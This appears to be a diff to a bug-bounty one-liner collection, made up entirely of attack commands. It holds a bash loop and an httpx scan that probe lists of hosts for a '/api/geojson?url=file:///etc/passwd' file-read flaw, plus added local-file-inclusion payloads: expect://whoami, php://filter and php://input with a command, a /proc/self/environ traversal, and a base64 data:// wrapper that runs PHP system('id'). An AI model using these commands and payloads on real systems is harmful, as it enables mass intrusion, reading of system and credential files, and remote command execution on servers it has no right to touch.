@@ -1,1 +1,11 @@
 cat targets.txt| while read host do;do curl --silent --insecure --path-as-is "$host/api/geojson?url=file:///etc/passwd" | grep -qs "root:x" && echo "$host \033[0;31m Vulnerable";done
+
+expect://whoami
+///path/to/file.ext
+=php://filter/resource=/etc/passwd
+post
+php://input&cmd=ls
+../../../proc/self/environ
+data://text/plain;base64,JTNDJTNGc3lzdGVtJTI4JTI3aWQlMjclMjklM0IlM0YlM0U=
+
+httpx -l IPlist.txt -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"
